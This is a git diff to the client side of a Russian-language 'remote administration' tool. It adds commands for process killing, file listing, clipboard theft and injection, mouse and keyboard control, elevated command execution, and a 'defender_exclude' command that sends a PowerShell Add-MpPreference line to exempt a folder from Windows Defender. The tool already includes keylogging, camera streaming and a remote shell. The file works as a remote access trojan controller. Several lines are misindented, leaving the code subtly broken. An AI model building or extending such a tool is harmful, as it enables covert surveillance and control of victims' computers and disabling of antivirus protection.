@@ -25,6 +25,7 @@ client.py — клиентская часть удалённого админи�
 import argparse
 import asyncio
 import base64
+import json
 import logging
 import os
 import sys
@@ -207,6 +208,51 @@ class RemoteClient:
 
                 elif t == "pong":
                     self._resolve_future("ping", True)
+
+                elif t == "heartbeat":
+                    self._resolve_future("heartbeat", msg["payload"])
+
+                elif t == "process_list":
+                    self._resolve_future("process_list", msg["payload"])
+
+                elif t == "process_kill_result":
+                    self._resolve_future("process_kill", msg["payload"])
+
+                elif t == "sysinfo":
+                    self._resolve_future("sysinfo", msg["payload"])
+
+                elif t == "fs_list":
+                    self._resolve_future("fs_list", msg["payload"])
+
+                elif t == "clipboard_result":
+                    self._resolve_future("clipboard", msg["payload"])
+
+                elif t == "update_status":
+                    status = msg["payload"].get("status", "unknown")
+                    message = msg["payload"].get("message", "")
+                    emoji_map = {
+                        "starting": "🔄",
+                        "downloading": "📥",
+                        "extracting": "📦",
+                        "installing": "⚙️",
+                        "restarting": "🔃",
+                        "error": "❌",
+                    }
+                    emoji = emoji_map.get(status, "ℹ️")
+                    print(f"\n{emoji} Обновление: {message}")
+                    if status == "restarting":
+                        print("   ⏳ Сервер перезапускается...")
+                    sys.stdout.write("remote> ")
+                    sys.stdout.flush()
+
+                elif t == "uninstall_result":
+                    self._resolve_future("uninstall", msg["payload"])
+
+                elif t == "mouse_result":
+                    self._resolve_future("mouse", msg["payload"])
+
+                elif t == "keyboard_result":
+                    self._resolve_future("keyboard", msg["payload"])
 
                 elif t == "keylog_data":
                     data = msg["payload"]["data"]
@@ -419,6 +465,224 @@ class RemoteClient:
         except asyncio.TimeoutError:
             print("❌ Таймаут пинга")
 
+    async def cmd_heartbeat(self):
+        await self._send({"type": "heartbeat", "payload": {}})
+        try:
+            info = await self._wait_future("heartbeat", timeout=10)
+            print(f"\n=== System Info ===")
+            print(f"  Host: {info.get('hostname', '?')}")
+            print(f"  OS: {info.get('os', '?')}")
+            if 'cpu_percent' in info:
+                print(f"  CPU: {info['cpu_percent']}% ({info.get('cpu_count', '?')} cores)")
+            if 'ram_total_gb' in info:
+                print(f"  RAM: {info['ram_used_gb']}/{info['ram_total_gb']} GB ({info.get('ram_percent', '?')}%)")
+            if 'disk_total_gb' in info:
+                print(f"  Disk: {info['disk_used_gb']}/{info['disk_total_gb']} GB ({info.get('disk_percent', '?')}%)")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут heartbeat")
+
+    async def cmd_process_list(self):
+        await self._send({"type": "process_list", "payload": {}})
+        try:
+            result = await self._wait_future("process_list", timeout=15)
+            procs = result.get("processes", [])
+            if not procs:
+                print("Нет процессов (или psutil не установлен)")
+                return
+            print(f"\n{'PID':>7}  {'CPU%':>6}  {'MEM%':>6}  {'Status':<10}  Name")
+            print("-" * 70)
+            for p in procs[:50]:
+                print(f"{p['pid']:>7}  {p['cpu']:>6.1f}  {p['mem']:>6.1f}  {p['status']:<10}  {p['name']}")
+            if len(procs) > 50:
+                print(f"... и ещё {len(procs) - 50} процессов")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут получения списка процессов")
+
+    async def cmd_process_kill(self, target):
+        if target.isdigit():
+            await self._send({"type": "process_kill", "payload": {"pid": int(target)}})
+        else:
+            await self._send({"type": "process_kill", "payload": {"name": target}})
+        try:
+            result = await self._wait_future("process_kill", timeout=10)
+            ok = result.get("success", False)
+            msg = result.get("message", "")
+            print(f"{'✅' if ok else '❌'} {msg}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_sysinfo(self):
+        await self._send({"type": "sysinfo", "payload": {}})
+        try:
+            info = await self._wait_future("sysinfo", timeout=10)
+            print(f"\n=== System Info ===")
+            for k, v in info.items():
+                if k == "ip":
+                    continue
+                print(f"  {k}: {v}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут sysinfo")
+
+    async def cmd_fs_list(self, path="."):
+        await self._send({"type": "fs_list", "payload": {"path": path}})
+        try:
+            result = await self._wait_future("fs_list", timeout=10)
+            if "error" in result:
+                print(f"❌ {result['error']}")
+                return
+            print(f"\n📁 {result.get('path', path)}")
+            entries = result.get("entries", [])
+            if not entries:
+                print("  (пусто)")
+                return
+            dirs = [e for e in entries if e.get("is_dir")]
+            files = [e for e in entries if not e.get("is_dir")]
+            for d in sorted(dirs, key=lambda x: x["name"]):
+                print(f"  [DIR]  {d['name']}")
+            for f in sorted(files, key=lambda x: x["name"]):
+                size = f.get("size", 0)
+                if size > 1024 * 1024:
+                    sz = f"{size / (1024*1024):.1f}MB"
+                elif size > 1024:
+                    sz = f"{size / 1024:.1f}KB"
+                else:
+                    sz = f"{size}B"
+                print(f"         {f['name']:<40} {sz}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут fs_list")
+
+    async def cmd_clipboard_get(self):
+        await self._send({"type": "clipboard_get", "payload": {}})
+        try:
+            result = await self._wait_future("clipboard", timeout=10)
+            if result.get("success"):
+                text = result.get("text", "")
+                print(f"\n📋 Clipboard:\n{text}")
+            else:
+                print(f"❌ Clipboard error: {result.get('text', '?')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут clipboard")
+
+    async def cmd_clipboard_set(self, text):
+        await self._send({"type": "clipboard_set", "payload": {"text": text}})
+        try:
+            result = await self._wait_future("clipboard", timeout=10)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('text', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут clipboard")
+
+    async def cmd_update(self):
+        confirm = input("🔄 Запустить обновление утилиты? (yes/no): ")
+        if confirm.lower() != "yes":
+            print("Отменено")
+            return
+        
+        print("\n📥 Запуск обновления...")
+        await self._send({"type": "update", "payload": {}})
+        
+        # Monitor update progress
+        print("⏳ Процесс обновления может занять несколько минут...")
+        print("   Сервер перезапустится автоматически по окончании.")
+        
+        # Wait a bit and inform user
+        await asyncio.sleep(2)
+        print("\n✅ Команда отправлена. Обновление начинается на сервере.")
+
+    async def cmd_uninstall(self):
+        confirm = input("⚠ Это полностью удалит сервер с удалённого ПК. Подтвердить? (yes/no): ")
+        if confirm.lower() != "yes":
+            print("Отменено")
+            return
+        await self._send({"type": "uninstall", "payload": {}})
+        try:
+            result = await self._wait_future("uninstall", timeout=15)
+            print(f"✅ Сервер удалён: {result.get('message', 'OK')}")
+        except asyncio.TimeoutError:
+            print("⚠ Таймаут — сервер, вероятно, уже завершился")
+
+    async def cmd_mouse_move(self, x, y, relative=False):
+        await self._send({"type": "mouse_move", "payload": {"x": x, "y": y, "relative": relative}})
+        try:
+            result = await self._wait_future("mouse", timeout=5)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_mouse_click(self, x=None, y=None, button="left", clicks=1):
+        p = {"button": button, "clicks": clicks}
+        if x is not None:
+            p["x"] = x
+            p["y"] = y
+        await self._send({"type": "mouse_click", "payload": p})
+        try:
+            result = await self._wait_future("mouse", timeout=5)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_mouse_scroll(self, dy=0, dx=0):
+        await self._send({"type": "mouse_scroll", "payload": {"dx": dx, "dy": dy}})
+        try:
+            result = await self._wait_future("mouse", timeout=5)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_keyboard_type(self, text):
+        await self._send({"type": "keyboard_type", "payload": {"text": text}})
+        try:
+            result = await self._wait_future("keyboard", timeout=10)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_keyboard_hotkey(self, keys_str):
+        keys = keys_str.split("+")
+        await self._send({"type": "keyboard_hotkey", "payload": {"keys": keys}})
+        try:
+            result = await self._wait_future("keyboard", timeout=5)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_keyboard_press(self, key):
+        await self._send({"type": "keyboard_press", "payload": {"key": key}})
+        try:
+            result = await self._wait_future("keyboard", timeout=5)
+            ok = result.get("success", False)
+            print(f"{'✅' if ok else '❌'} {result.get('message', '')}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
+    async def cmd_exec_elevated(self, command):
+        log.info("Elevated exec: %s", command)
+        await self._send({"type": "exec_elevated", "payload": {"command": command}})
+        try:
+            result = await self._wait_future("exec", timeout=10)
+            print(f"\n--- ELEVATED ---")
+            print(result.get("stdout", ""))
+            if result.get("stderr"):
+                print(f"\n--- STDERR ---\n{result['stderr']}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут elevated exec")
+
+    async def cmd_defender_exclude(self):
+        log.info("Adding Defender exclusion...")
+        await self._send({"type": "exec_elevated", "payload": {
+            "command": f'powershell -Command "Add-MpPreference -ExclusionPath \'{os.getcwd()}\'"'
+        }})
+        try:
+            result = await self._wait_future("exec", timeout=15)
+            print(f"Defender exclusion result: {result.get('stdout', '') or 'Sent'}")
+        except asyncio.TimeoutError:
+            print("❌ Таймаут")
+
     # --- Keylogger commands ---
 
     async def cmd_keylog_start(self):
@@ -478,20 +742,35 @@ class RemoteClient:
         print("\n" + "=" * 60)
         print("  Remote Admin Client — управляющий ПК")
         print("=" * 60)
-        print("""  Команды:
-  screenshot          — получить скриншот
-  stream              — запустить/остановить камеру
-  exec <command>      — выполнить команду
-  shell               — интерактивная оболочка
-  send <local> <remote> — отправить файл
-  recv <remote> <local> — получить файл
-  keylog start        — запустить кейлоггер
-  keylog stop         — остановить кейлоггер
-  keylog get          — получить данные кейлоггера
-  keylog auto         — непрерывный мониторинг клавиатуры
-  ping                — проверка соединения
-  help                — справка
-  exit                — отключиться
+         print("""  Команды:
+    screenshot          — получить скриншот
+    stream              — запустить/остановить камеру
+    exec <command>      — выполнить команду
+    shell               — интерактивная оболочка
+    send <local> <remote> — отправить файл
+    recv <remote> <local> — получить файл
+    keylog start        — запустить кейлоггер
+    keylog stop         — остановить кейлоггер
+    keylog get          — получить данные кейлоггера
+    keylog auto         — непрерывный мониторинг клавиатуры
+    ps                  — список процессов
+    kill <pid|name>     — убить процесс
+    sysinfo             — информация о системе (CPU/RAM/Disk)
+    ls [path]           — листинг директории
+    clipboard           — прочитать буфер обмена
+    clipboard set <text>— записать в буфер обмена
+    heartbeat           — статус системы (heartbeat)
+    mouse_move <x> <y>  — двигать мышь
+    mouse_click         — клик мышью
+    mouse_scroll <dy>   — скролл
+    type <text>         — напечатать текст
+    hotkey <keys>       — комбинация клавиш
+    press <key>         — нажать клавишу
+    update              — обновить утилиту с GitHub
+    uninstall           — удалить сервер с удалённого ПК
+    ping                — проверка соединения
+    help                — справка
+    exit                — отключиться
 """)
 
         stream_active = False
@@ -565,6 +844,85 @@ class RemoteClient:
                     await self.cmd_recv_file(remote_path, local_path)
                 elif cmd == "ping":
                     await self.cmd_ping()
+                elif cmd == "heartbeat":
+                    await self.cmd_heartbeat()
+                elif cmd == "ps":
+                    await self.cmd_process_list()
+                elif cmd == "kill":
+                    if not args:
+                        print("Использование: kill <pid|name>")
+                        continue
+                    await self.cmd_process_kill(args)
+                elif cmd == "sysinfo":
+                    await self.cmd_sysinfo()
+                elif cmd == "ls" or cmd == "dir":
+                     await self.cmd_fs_list(args if args else ".")
+                elif cmd == "clipboard":
+                    if args.startswith("set "):
+                        await self.cmd_clipboard_set(args[4:])
+                    else:
+                        await self.cmd_clipboard_get()
+                elif cmd == "update":
+                    await self.cmd_update()
+                elif cmd == "uninstall":
+                    await self.cmd_uninstall()
+                elif cmd == "mouse_move" or cmd == "mmove":
+                    parts = args.split()
+                    if len(parts) >= 2:
+                        rel = "--rel" in parts
+                        x = int(parts[0])
+                        y = int(parts[1])
+                        await self.cmd_mouse_move(x, y, relative=rel)
+                    else:
+                        print("Использование: mouse_move <x> <y> [--rel]")
+                elif cmd == "mouse_click" or cmd == "mclick":
+                    parts = args.split()
+                    button = "left"
+                    clicks = 1
+                    x = y = None
+                    for p in parts:
+                        if p in ("left", "right", "middle"):
+                            button = p
+                        elif p.startswith("x"):
+                            try:
+                                x = int(p[1:])
+                            except ValueError:
+                                pass
+                        elif p.startswith("y"):
+                            try:
+                                y = int(p[1:])
+                            except ValueError:
+                                pass
+                        elif p.isdigit():
+                            clicks = int(p)
+                    await self.cmd_mouse_click(x=x, y=y, button=button, clicks=clicks)
+                elif cmd == "mouse_scroll" or cmd == "mscroll":
+                    parts = args.split()
+                    dy = int(parts[0]) if parts else 3
+                    dx = int(parts[1]) if len(parts) > 1 else 0
+                    await self.cmd_mouse_scroll(dy=dy, dx=dx)
+                elif cmd == "type" or cmd == "keyboard_type":
+                    if not args:
+                        print("Использование: type <text>")
+                        continue
+                    await self.cmd_keyboard_type(args)
+                elif cmd == "hotkey":
+                    if not args:
+                        print("Использование: hotkey ctrl+c")
+                        continue
+                    await self.cmd_keyboard_hotkey(args)
+                elif cmd == "press":
+                    if not args:
+                        print("Использование: press <key>")
+                        continue
+                    await self.cmd_keyboard_press(args)
+                elif cmd == "elevated" or cmd == "sudo":
+                    if not args:
+                        print("Использование: elevated <command>")
+                        continue
+                    await self.cmd_exec_elevated(args)
+                elif cmd == "defender_exclude":
+                    await self.cmd_defender_exclude()
                 elif cmd == "keylog":
                     if args.startswith("auto"):
                         await self.cmd_keylog_auto_start()
@@ -597,8 +955,8 @@ class RemoteClient:
         log.info("Клиент остановлен")
 
     @staticmethod
-    def _print_help():
-        print("""
+     def _print_help():
+         print("""
 Доступные команды:
   screenshot [quality]       Получить скриншот (quality: 1-100, по умолч. 80)
   stream [fps]               Запустить/остановить видеопоток с камеры
@@ -610,6 +968,21 @@ class RemoteClient:
   keylog stop                Остановить кейлоггер
   keylog get                 Получить накопленные данные
   keylog auto                Непрерывный мониторинг (автостоп повторной командой)
+  ps                         Список процессов
+  kill <pid|name>            Убить процесс
+  sysinfo                    Информация о системе (CPU/RAM/Disk)
+  ls [path]                  Листинг директории
+  clipboard                  Прочитать буфер обмена
+  clipboard set <text>       Записать в буфер обмена
+  heartbeat                  Статус системы
+  mouse_move <x> <y> [--rel] Двигать мышь (абсолютно или относительно)
+  mouse_click [left|right|middle] [clicks]  Клик мышью
+  mouse_scroll <dy> [dx]     Скролл
+  type <text>                Напечатать текст (клавиатура)
+  hotkey <key+key+...>       Нажать комбинацию (напр. ctrl+c)
+  press <key>                Нажать клавишу
+  update                     Обновить утилиту с GitHub
+  uninstall                  Удалить сервер с удалённого ПК
   ping                       Проверить соединение
   help                       Показать эту справку
   exit                       Отключиться и выйти
@@ -631,7 +1004,62 @@ def main():
     parser.add_argument("--server", required=True, help="Адрес сервера (IP или домен)")
     parser.add_argument("--port", type=int, default=8765, help="Порт сервера (по умолч. 8765)")
     parser.add_argument("--secret", required=True, help="Общий секрет (токен)")
+    parser.add_argument("--relay", help="Relay server address (host:port) for NAT traversal")
     args = parser.parse_args()
+
+    if args.relay:
+        relay_host, relay_port = args.relay.rsplit(":", 1) if ":" in args.relay else (args.relay, "9000")
+        relay_uri = f"ws://{relay_host}:{relay_port}"
+        import hashlib as _hl
+        room_id = _hl.sha256(args.secret.encode()).hexdigest()[:16]
+        fernet = make_fernet(args.secret)
+
+        async def relay_main():
+            log.info("Подключение через relay %s ...", relay_uri)
+            ws = await websockets.connect(relay_uri, ping_interval=30, ping_timeout=10)
+            auth = {"type": "auth", "room": room_id, "token": args.secret, "role": "client"}
+            await ws.send(json.dumps(auth))
+            resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
+            if resp.get("type") != "auth_ok":
+                log.error("Relay auth failed: %s", resp)
+                return
+            log.info("Relay authenticated, room: %s", room_id)
+            await ws.send(encrypt_msg(fernet, {"type": "auth", "payload": {"token": args.secret}}))
+            raw = await asyncio.wait_for(ws.recv(), timeout=10)
+            auth_resp = decrypt_msg(fernet, raw)
+            if auth_resp.get("type") != "auth_ok":
+                log.error("Server auth failed via relay")
+                return
+
+            class RelayClient(RemoteClient):
+                def __init__(self, ws_conn, f, s):
+                    self.uri = relay_uri
+                    self.fernet = f
+                    self.secret = s
+                    self.ws = ws_conn
+                    self.running = True
+                    self.stream_viewer = StreamViewer()
+                    self.shell_active = False
+                    self.authenticated = asyncio.Event()
+                    self._pending_futures = {}
+                    self._file_chunk_queue = asyncio.Queue()
+                    self._collecting_file = False
+                    self._shell_output_parts = []
+                    self._shell_output_ready = asyncio.Event()
+                    self._keylog_auto_running = False
+                    self._keylog_auto_task = None
+                    self.authenticated.set()
+
+            client = RelayClient(ws, fernet, args.secret)
+            await client.run_cli()
+
+        try:
+            asyncio.run(relay_main())
+        except KeyboardInterrupt:
+            print("\n⚠ Прервано")
+        except Exception as e:
+            log.exception("Критическая ошибка: %s", e)
+        return
 
     uri = f"ws://{args.server}:{args.port}"
     client = RemoteClient(uri, args.secret)
